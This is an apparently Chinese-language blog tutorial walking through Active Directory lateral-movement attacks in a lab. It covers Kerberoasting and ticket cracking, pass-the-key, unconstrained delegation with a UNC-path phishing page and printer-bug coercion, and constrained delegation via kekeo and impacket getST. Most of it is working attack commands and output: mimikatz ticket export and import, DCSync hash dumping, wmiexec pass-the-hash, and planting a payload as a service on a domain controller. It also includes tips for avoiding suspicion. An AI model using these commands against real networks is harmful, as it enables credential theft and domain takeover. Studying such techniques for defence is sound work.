<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131162240023.png" alt="image-20250131162240023"></p>
<p>成功后klist一下</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154321939.png" alt="image-20250517154321939" style="zoom:80%;" />

<p>出现了一个RC4的！可能可以利用。</p>
<p>上述无论是工具完成还是手工完成，下一步都应该是导出票据文件！（如果利用破解klist文件来破解的话）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>然后就是破解啦！破解有两种方法。</p>
<ol>
<li>破解Hash值</li>
<li>破解klist文件，也就是.kirbi文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件票据：python tgsrepcrack.py pass.txt &quot;xx.kirbi&quot;</span><br><span class="line">HASH密文：hashcat -m 13100 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure>

<p>先示范第二种方法！<strong>破解klist文件</strong></p>
<p>导出后下载到本地桌面即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131162936679.png" alt="image-20250131162936679"></p>
<p>破解的时候需要用到kerberoast工具包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py pass.txt F:\内网安全\横向移动\ptt票据攻击\kerberoast-master\1-40a00000-pc-jack-0day$@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131163914555.png" alt="image-20250131163914555"></p>
<p>直接破解出来啦！Admin12345，我们可以看看dc上的说明，发现我们获取了sqlsvr的密码！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131164739069.png" alt="image-20250131164739069"></p>
<p><strong>破解Hash值</strong></p>
<p>把之前用impacket套件获取的hash.txt文件放到hashcat里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt /root/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131165831317.png" alt="image-20250131165831317"></p>
<p>直接爆破出来啦！拿捏！</p>
<h5 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h5><p>当系统安装了KB2871997补丁并且禁用了NTLM的时候，那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。这个打了补丁才能玩呵呵。。没事，作为一种拓展吧。有点鸡肋啊。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#主要用于 提取 Windows LSASS 进程中的 EKeys（加密密钥）</span><br><span class="line">mimikatz sekurlsa::ekeys</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br><span class="line">mimikatz sekurlsa::pth /user:sqlserver\administrator /domain:192.168.3.32 /aes256:39acf6c939cbfc4fd9cb36ef5aa417d2a36c4086f2e146bd663cc9885615d45e</span><br></pre></td></tr></table></figure>

<p>这里拿god.org来试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131174340348.png" alt="image-20250131174340348"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131174811170.png" alt="image-20250131174811170"></p>
<p>执行后web主机弹出一个shell，拥有system权限，但仍然是web主机的，没成功横向移动</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250131174909022.png" alt="image-20250131174909022"></p>
<p>因此这个横向移动就失败了。。。他有点鸡肋，要打补丁且禁用NTLM。</p>
<p>实战场景也不常见，太少了</p>
<h3 id="委派（基于配置）"><a href="#委派（基于配置）" class="headerlink" title="委派（基于配置）"></a>委派（基于配置）</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>
<p>委派是一种域内应用模式，是指将域内用户账户的权限委派给服务账号，服务账号因此能以用户的身份在域内展开活动（请求新的服务等），类似于租房中介房东的关系。</p>
<p>域委派分类：</p>
<p>1、非约束委派(Unconstrained Delegation, UD)</p>
<p>2、约束委派(Constrained Delegation, CD)</p>
<p>3、基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</p>
<p>简而言之，非约束委派是指用户账户将自身的TGT转发给服务账户使用。约束委派通过S4U2Self和S4U2Proxy两个拓展协议限制服务账户只能访问指定服务资源。</p>
<p>RBCD主要就是委派的管理移交给服务资源进行控制，其余和约束性委派基本相同。</p>
<blockquote>
<p>账户分类：</p>
<p>机器账户：计算机本身名称的账户，在域中computers组内的计算机。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202154918336.png" alt="image-20250202154918336"></p>
<p>主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202154942563.png" alt="image-20250202154942563"></p>
<p>服务账户：计算机服务安装时创建的账户，用于运行服务时使用，不可用于登入计算机。</p>
</blockquote>
<p>能不能通过委派这种方法来横向移动主要就是看dc上的设置，有没有设置主机账户、机器账户上的委派。如果设置不信任此计算机来源，那就是没有委派；如果是信任此计算机来委派任何服务就是非约束委派；如果是仅信任此计算机来委派指定的服务那就是约束委派。那么我们怎么知道其配置呢？？具体往下看！</p>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p>
<blockquote>
<p>利用场景：攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户。</p>
</blockquote>
<p>复现配置：</p>
<p>1、信任此计算机来委派任何服务</p>
<p>2、setspn -U -A priv&#x2F;test webadmin</p>
<p>设置机器账户的委派：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202155129515.png" alt="image-20250202155129515"></p>
<p>此处本来是没有委派选项的，我们可以通过以下命令来使他有该选项。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test webadmin</span><br></pre></td></tr></table></figure>

<p>设置主机账户的委派：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202155438114.png" alt="image-20250202155438114"></p>
<p>然后把委派也改成信任此计算机来委派任何服务</p>
<p>判断是否设置委派：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询域内设置了非约束委派的服务账户：</span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br><span class="line">查询域内设置了非约束委派的机器账户:</span><br><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>

<p>首先把AdFind上传到web主机。（查询域内是否设置了非约束委派的服务账户）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202160504986.png" alt="image-20250202160504986"></p>
<p>查到了一个webadmin！接下来我们可以对比一下，如果我们把webadmin的委派去掉，回显如何？</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202160616133.png" alt="image-20250202160616133"></p>
<p>（查询域内是否设置了非约束委派机器账户）如果返回0或者只有一个dc那就不存在委派攻击<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202161056990.png" alt="image-20250202161056990"></p>
<p>然后就是委派攻击的利用了。</p>
<h5 id="利用思路1：诱使域管理员访问机器"><a href="#利用思路1：诱使域管理员访问机器" class="headerlink" title="利用思路1：诱使域管理员访问机器"></a>利用思路1：诱使域管理员访问机器</h5><p>利用条件：</p>
<p>1、需要Administrator权限</p>
<p>2、域内主机的机器账户开启非约束委派</p>
<p>3、域控管理员远程访问（主动或被动）</p>
<p>利用过程：</p>
<p><strong>1、域控与委派机器通讯</strong></p>
<p>主动：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\webserver</span><br></pre></td></tr></table></figure>

<p>钓鱼：（just like xss，钓鱼让对面访问你，从而产生票据）</p>
<p><a target="_blank" rel="noopener" href="http://192.168.3.31/31.html">http://192.168.3.31/31.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;img src=&quot;file:///\\192.168.3.31\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>我觉得这种委派攻击神似PTT的利用历史遗留。</p>
<p>我们先在dc上模拟与委派机器通讯</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202163125261.png" alt="image-20250202163125261"></p>
<p>对于钓鱼的方法这里也同步演示一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202164808941.png" alt="image-20250202164808941"></p>
<p>给他传到web主机。这里我也直接改了个名，改成index.html了！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202165746058.png" alt="image-20250202165746058"></p>
<p>然后让域控在浏览器访问一下web主机的web服务</p>
<p>最好把31.html命令为index.html，那样的话直接访问首页就行，不容易被怀疑！</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202174242644.png" alt="image-20250202174242644"></p>
<p>然后导出就行，一个道理，虽然我本地复现失败了，没有administrator的，环境问题？</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154520153.png" alt="image-20250517154520153"></p>
<p><strong>2.导出票据到本地</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154527784.png" alt="image-20250517154527784" style="zoom:80%;" />

<p>生成了一堆。我们发现里面有个Administrator哦！应该就是之前dc访问时留下的票据文件了。</p>
<p><strong>3.导入票据到内存</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;426589]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br></pre></td></tr></table></figure>

<p>在此之前我们先尝试连接通讯域控。做个对比</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202163705815.png" alt="image-20250202163705815"></p>
<p>然后我们导入票据</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202163747947.png" alt="image-20250202163747947"></p>
<p><strong>4.连接通讯域控</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202163756856.png" alt="image-20250202163756856"></p>
<p>成功通讯哦耶！</p>
<p>至于上线，就很简单了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\owa2010cn-god\c$</span><br><span class="line">shell copy 3232.exe \\owa2010cn-god\c$</span><br><span class="line">shell sc \\owa2010cn-god create aaaa binpath= &quot;c:\3232.exe&quot;</span><br><span class="line">shell sc \\owa2010cn-god start aaaa</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202164213790.png" alt="image-20250202164213790"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202164222372.png" alt="image-20250202164222372"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202164237332.png" alt="image-20250202164237332"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250202164337725.png" alt="image-20250202164337725"></p>
<p>成功上线！</p>
<h5 id="利用思路2：结合打印机漏洞"><a href="#利用思路2：结合打印机漏洞" class="headerlink" title="利用思路2：结合打印机漏洞"></a>利用思路2：结合打印机漏洞</h5><p><strong>利用条件：DC 2012以上</strong>（重要，不然就报错用不了，而且网上说2012好像也不行，我这里用2016来做。）</p>
<p>1、Administrator权限监听</p>
<p>2、打印机服务spooler开启（默认开启）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203161833021.png" alt="image-20250203161833021"></p>
<p>这里我们使用内网域-打印机漏洞环境</p>
<p>首先设置机器账户和主机账户的委派</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154619752.png" alt="image-20250517154619752" style="zoom:80%;" />

<p>上线web主机，上线管理员＋域用户，提权就不演示了，土豆家族</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203153245616.png" alt="image-20250203153245616"></p>
<p>把Rubeus和SpoolSample工具上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203153436751.png" alt="image-20250203153436751"></p>
<p>利用过程：</p>
<p>1、监听来自DC的请求数据并保存文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus.exe monitor /interval:2 /filteruser:dc$ &gt;hash.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203153527525.png" alt="image-20250203153527525"></p>
<p>注意此处监听命令要以Administrator的权限去执行，不能以域用户的命令执行。否则产生的hash.txt中会有如下报错：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154652503.png" alt="image-20250517154652503"></p>
<p>正确如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203153942968.png" alt="image-20250203153942968"></p>
<p>由于是监听状态，因此hash.txt为0b</p>
<p>域用户运行SpoolSample强制让DC请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell SpoolSample.exe dc web2016</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203154037006.png" alt="image-20250203154037006"></p>
<p>执行完成后我们发现hash.txt中有数据了，把它下载下来</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203154121856.png" alt="image-20250203154121856"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203154156390.png" alt="image-20250203154156390"></p>
<p>这个票据其实就是域控的票据，然后接下来我们通过Rubeus将票据导入到内存中</p>
<p>2、Rubeus监听到票据并导入该票据（域内用户进行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell Rubeus.exe ptt /ticket:xxx</span><br></pre></td></tr></table></figure>

<p>为什么不用mimikatz导入呢？因为它的数据格式，它是由Rubeus监听得到的，自然就要用他来导入了。</p>
<p>我们注意将hash.txt中的票据处理一下换行</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154730092.png" alt="image-20250517154730092"></p>
<p>将票据成功导入到内存中，接下来可以用mimikatz导出内存中的hash！</p>
<p>3、使用mimikatz导出域内Hash（域内用户进行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:xiaodi8.com /all /csv</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203154952411.png" alt="image-20250203154952411"></p>
<p>成功获取到hash，那么接下来我们可以通过之前说过的基于口令凭据，利用hash来进行横向移动</p>
<p>4、使用wmi借助hash横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :e6f01fc9f2a0dc96871220f7787164bd xiaodi8.com/administrator@dc.xiaodi8.com -no-pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes :e6f01fc9f2a0dc96871220f7787164bd xiaodi8.com/administrator@192.168.139.11 -no-pass</span><br></pre></td></tr></table></figure>

<p>此处我用上面的不行，改成下面的ip形式则可以。要改hosts文件才能用上面那种！否则解析不了域名！会解析到外网去。</p>
<p>想要知道域控ip也很简单</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203160604809.png" alt="image-20250203160604809"></p>
<p>使用域名的结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203160507072.png" alt="image-20250203160507072"></p>
<p>因此我们要改hosts文件</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154802938.png" alt="image-20250517154802938" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203161118608.png" alt="image-20250203161118608"></p>
<p>完美拿捏！</p>
<p>直接使用ip地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203160413529.png" alt="image-20250203160413529"></p>
<h5 id="利用思路3：结果PetitPotam"><a href="#利用思路3：结果PetitPotam" class="headerlink" title="利用思路3：结果PetitPotam"></a>利用思路3：结果PetitPotam</h5><p>适用于windows其他版本</p>
<p>结合NTLM Relay监听，后续讲到。</p>
<h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p>
<blockquote>
<p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据<br><code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据<br>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。</p>
</blockquote>
<p>利用场景：</p>
<p>如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。</p>
<p>则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
<p>复现配置：</p>
<p>1、机器设置仅信任此计算机指定服务-cifs</p>
<p>2、用户设置仅信任此计算机指定服务-cifs</p>
<blockquote>
<p>CIFS，通用网络文件系统协议。CIFS 是一个新提出的协议，它使程序可以访问远程Internet计算机上的文件并要求此计算机提供服务。CIFS 使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%2F%E6%9C%8D%E5%8A%A1%E5%99%A8/3351471?fromModule=lemma_inlink">客户&#x2F;服务器</a>模式。客户程序请求远在服务器上的服务器程序为它提供服务。服务器获得请求并返回响应。CIFS是公共的或开放的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SMB%E5%8D%8F%E8%AE%AE/3770892?fromModule=lemma_inlink">SMB协议</a>版本，并由Microsoft使用。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SMB%E5%8D%8F%E8%AE%AE/3770892?fromModule=lemma_inlink">SMB协议</a>在局域网上用于服务器文件访问和打印的协议。像SMB协议一样，CIFS在高层运行，而不像<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE/212915?fromModule=lemma_inlink">TCP&#x2F;IP协议</a>那样运行在底层。CIFS可以看做是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445?fromModule=lemma_inlink">应用程序</a>协议如<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/1874113?fromModule=lemma_inlink">文件传输协议</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8535513?fromModule=lemma_inlink">超文本传输协议</a>的一个实现。</p>
</blockquote>
<p>配置约束委派</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154826721.png" alt="image-20250517154826721"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154836346.png" alt="image-20250517154836346"></p>
<p>判断是否设置约束委派：</p>
<p>查询机器用户（主机）配置约束委派</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203165856684.png" alt="image-20250203165856684"></p>
<p>查询服务账户（主机）配置约束委派</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203165915516.png" alt="image-20250203165915516"></p>
<h5 id="利用思路1：使用机器账户的Hash值-kekeo"><a href="#利用思路1：使用机器账户的Hash值-kekeo" class="headerlink" title="利用思路1：使用机器账户的Hash值 | kekeo"></a>利用思路1：使用机器账户的Hash值 | kekeo</h5><p>这里的利用思路其实都是一样的，就是工具不一样。。。</p>
<p>1、获取webadmin用户的票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203170959347.png" alt="image-20250203170959347"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171014858.png" alt="image-20250203171014858"></p>
<p>成功生成了webadmin的票据文件</p>
<p>2.利用用户票据获取域控票据</p>
<p>利用webadmin用户票据请求获取域控票据</p>
<p>就是利用s4u协议申请域管用户访问自身服务的ST服务票据</p>
<blockquote>
<p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171444323.png" alt="image-20250203171444323"></p>
<p>成功执行后生成两个TGS文件（票据授权服务器）</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171501860.png" alt="image-20250203171501860"></p>
<p>3、导入票据到内存</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi</span><br></pre></td></tr></table></figure>

<p>在导入之前我们可以先尝试连接一下，看能否访问上。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171805949.png" alt="image-20250203171805949"></p>
<p>毋庸置疑是不可以的。</p>
<p>那么接下来我们通过mimikatz来导入票据到内存中去。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171900530.png" alt="image-20250203171900530"></p>
<p>4、连接通讯域控</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god.god.org\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203171921562.png" alt="image-20250203171921562"></p>
<p>成功通讯，上线的操作就不说了。。。</p>
<h5 id="利用思路2：使用机器账户的Hash值-getST"><a href="#利用思路2：使用机器账户的Hash值-getST" class="headerlink" title="利用思路2：使用机器账户的Hash值 | getST"></a>利用思路2：使用机器账户的Hash值 | getST</h5><p>这里说一下getST的原因是因为他是在impacket套件里的，可以规避免杀这一烦恼，只需要建立一个socks代理即可。</p>
<p>先获取webadmin用户的密码，直接用cs插件即可，非常方便。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250517154932194.png" alt="image-20250517154932194" style="zoom:80%;" />

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203175239053.png" alt="image-20250203175239053"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用getST申请服务票据</span><br><span class="line">python getST.py -dc-ip 192.168.3.21 -spn CIFS/OWA2010CN-God.god.org -impersonate administrator god.org/webadmin -hashes :518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203175514809.png" alt="image-20250203175514809"></p>
<p>生成了如下票据文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203175544442.png" alt="image-20250203175544442"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用票据远程访问</span><br><span class="line">KRB5CCNAME=administrator@CIFS_OWA2010CN-God.god.org@GOD.ORG.ccache python wmiexec.py -k god.org/administrator@OWA2010CN-God.god.org -no-pass -dc-ip 192.168.3.21</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203175846205.png" alt="image-20250203175846205"></p>
<p>服了。。。这种要在kali上弄。。。但是步骤没啥问题</p>
<p>这里应该是可以直接用mimikatz导入票据然后进行的，我试试</p>
<p>在导入之前先尝试连接一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250203180417548.png" alt="image-20250203180417548"></p>
